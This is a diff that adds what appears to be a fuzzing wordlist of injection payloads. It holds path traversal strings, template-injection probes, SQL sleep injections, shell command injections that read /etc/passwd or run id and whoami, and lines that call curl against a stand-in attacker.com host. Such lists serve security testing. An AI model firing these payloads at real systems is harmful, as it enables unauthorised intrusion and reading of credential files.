@@ -1,0 +1,150 @@
+'
+"
+`
+<
+>
+;
+|
+&
+!
+@
+#
+$
+%
+^
+*
+(
+)
+[
+]
+{
+}
+\
+/
+?
+=
++
+,
+.
+:
+~
+-
+_
+null
+undefined
+true
+false
+0
+1
+-1
+999999999
+9999999999999999999
+0.0
+-0
+NaN
+Infinity
+-Infinity
+1e100
+0x00
+\x00
+\n
+\r
+\t
+\0
+\u0000
+\uFFFD
+\uFFFF
+%00
+%0a
+%0d
+%09
+%27
+%22
+%3c
+%3e
+%3b
+%7c
+%26
+%24
+%25
+%5c
+%2f
+%2e%2e%2f
+%252f
+%252e%252e%252f
+../
+../../
+../../../
+../../../../
+%2e%2e/
+%2e%2e%2f
+....//
+${7777*7777}
+{{7777*7777}}
+<%=7777*7777%>
+#{7777*7777}
+<%= 7777*7777 %>
+${7*7}
+{{7*7}}
+[7*7]
+{7*7}
+*{7*7}
+@{7*7}
+`7*7`
+${{7*7}}
+#{{7*7}}
+${{{7*7}}}
+{{7*7}}{{7*7}}
+${request.getClass()}
+{{config}}
+{{self.__class__}}
+{{request.__class__}}
+{{''.__class__}}
+${{%7*7%}}
+[[7*7]]
+(<%= 7 * 7 %>)
+@(7*7)
+&{7*7}
+%(7*7)s
+{7*7}
+1 sidtheory=here
+1 or sleep(3)
+1 AND SLEEP(3)
+1; ls -la
+1 | ls -la
+1 && ls -la
+1 || ls -la
+1` command injection `
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+|| cat /etc/passwd
+\n cat /etc/passwd
+\r\n cat /etc/passwd
+$(cat /etc/passwd)
+`cat /etc/passwd`
+;id
+|id
+&id
+&&id
+||id
+$(id)
+`id`
+;whoami
+|whoami
+&whoami
+$(whoami)
+`whoami`
+;sleep 5
+|sleep 5
+&sleep 5
+&&sleep 5
+||sleep 5
+$(sleep 5)
+`sleep 5`
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+;curl attacker.com
+|curl attacker.com
+$(curl attacker.com)
